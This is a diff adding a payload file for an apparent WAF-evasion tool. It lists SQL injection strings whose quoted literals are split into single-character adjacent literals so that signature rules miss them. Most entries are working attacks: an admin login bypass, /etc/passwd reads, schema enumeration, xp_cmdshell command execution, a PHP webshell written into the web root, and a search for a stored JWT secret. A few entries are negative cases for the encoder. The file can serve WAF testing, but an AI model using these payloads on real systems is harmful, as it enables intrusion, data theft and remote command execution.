@@ -1,0 +1,87 @@
+schema = 1
+# SQL injection payloads pre-encoded with the `sql_adjacent_string_concat`
+# tamper. Every `'string'` literal of length ≥ 2 is rewritten as a
+# sequence of single-character adjacent literals — pure ANSI SQL-92 §5.3
+# adjacent-literal concat, implemented by MySQL, Postgres, SQLite, Oracle,
+# DB2.
+#
+# Zero special characters introduced. No CONCAT(). No comments. The WAF
+# rule looking for `'admin'` sees `'a' 'd' 'm' 'i' 'n'` — five unrelated
+# single-character strings. The database parser rejoins them at parse
+# time.
+#
+# Manual form:
+#   wafrift evade --only tamper/sql_adjacent_string_concat \
+#     --payload "' OR username='admin'--"
+
+[[case]]
+id = "adjacent_concat_admin_login"
+class = "sql"
+payload = "' OR username='a' 'd' 'm' 'i' 'n'--"
+description = "Classic credential bypass — `'admin'` split into 5 single-char literals. CRS rule 942100 family's `'admin'`/`'root'` literal-substring detector misses. Database parser sees `username='admin'` and matches."
+
+[[case]]
+id = "adjacent_concat_etc_passwd_lfi"
+class = "sql"
+payload = "' UNION SELECT LOAD_FILE('/' 'e' 't' 'c' '/' 'p' 'a' 's' 's' 'w' 'd')--"
+description = "LFI via LOAD_FILE — `/etc/passwd` shattered into 11 single-char literals. The path-traversal regex matching `/etc/passwd` byte sequence is fully bypassed."
+
+[[case]]
+id = "adjacent_concat_root_user"
+class = "sql"
+payload = "' AND user()='r' 'o' 'o' 't' '@' 'l' 'o' 'c' 'a' 'l' 'h' 'o' 's' 't'--"
+description = "MySQL user() identity bypass — `'root@localhost'` shattered. The high-value `root@` and `@localhost` byte signatures both disappear."
+
+[[case]]
+id = "adjacent_concat_information_schema"
+class = "sql"
+payload = "' UNION SELECT table_name FROM 'i' 'n' 'f' 'o' 'r' 'm' 'a' 't' 'i' 'o' 'n' '_' 's' 'c' 'h' 'e' 'm' 'a'.tables--"
+description = "Schema enumeration — `'information_schema'` shattered into 18 single-char literals. CRS rules for `information_schema` substring miss."
+
+[[case]]
+id = "adjacent_concat_xp_cmdshell_arg"
+class = "sql"
+payload = "'; EXEC xp_cmdshell('n' 'e' 't' ' ' 'u' 's' 'e' 'r')--"
+description = "MSSQL xp_cmdshell with command argument `'net user'` shattered. Any rule scanning quoted argument bytes for `'net user'`/`'cmd.exe'`/`'whoami'` misses."
+
+[[case]]
+id = "adjacent_concat_php_webshell_outfile"
+class = "sql"
+payload = "' UNION SELECT '<' '?' 'p' 'h' 'p' ' ' 's' 'y' 's' 't' 'e' 'm' '(' '$' '_' 'G' 'E' 'T' '[' '1' ']' ')' ';' '?' '>' INTO OUTFILE '/' 'v' 'a' 'r' '/' 'w' 'w' 'w' '/' 's' '.' 'p' 'h' 'p'--"
+description = "Double-shatter: PHP webshell body AND outfile path. `<?php system(` (canonical PHP-shell drop signature) and `/var/www/` (top web-root path) both invisible."
+
+[[case]]
+id = "adjacent_concat_postgres_pg_read_file"
+class = "sql"
+payload = "' UNION SELECT pg_read_file('/' 'e' 't' 'c' '/' 'p' 'a' 's' 's' 'w' 'd',0,1000)--"
+description = "Postgres `pg_read_file` LFI — superuser-only function, path shattered to bypass `/etc/passwd` byte regex."
+
+[[case]]
+id = "adjacent_concat_or_one_equals_one"
+class = "sql"
+payload = "' OR ''='' --"
+description = "Empty-string comparison — literal `''` is length 0, below threshold, passes through. Validates the threshold-guard branch."
+
+[[case]]
+id = "adjacent_concat_short_literal_pass"
+class = "sql"
+payload = "' OR x='a'--"
+description = "Single-char literal `'a'` (len 1) MUST pass through unchanged. Negative-case coverage proving the tamper doesn't over-fire on already-minimal literals."
+
+[[case]]
+id = "adjacent_concat_jwt_secret_hunt"
+class = "sql"
+payload = "' UNION SELECT value FROM config WHERE key='j' 'w' 't' '_' 's' 'e' 'c' 'r' 'e' 't'--"
+description = "App-specific identifier hunt: `'jwt_secret'` shattered into 10 single-char literals. High-confidence WAF token (`jwt_secret` is in many keyword lists) — fragmentation defeats it."
+
+[[case]]
+id = "adjacent_concat_escaped_quote_passthrough"
+class = "sql"
+payload = "' OR name='O''Brien'--"
+description = "Defensive — literals containing the `''` escape sequence are NOT split (would break SQL semantics). Pass through verbatim. Validates the conservative-handling branch."
+
+[[case]]
+id = "adjacent_concat_double_literal_shatter"
+class = "sql"
+payload = "' AND username='a' 'd' 'm' 'i' 'n' AND password='s' 'e' 'c' 'r' 'e' 't' '1' '2' '3'--"
+description = "Both quoted literals shattered independently. Validates the tamper iterates correctly across multiple literals in one payload."
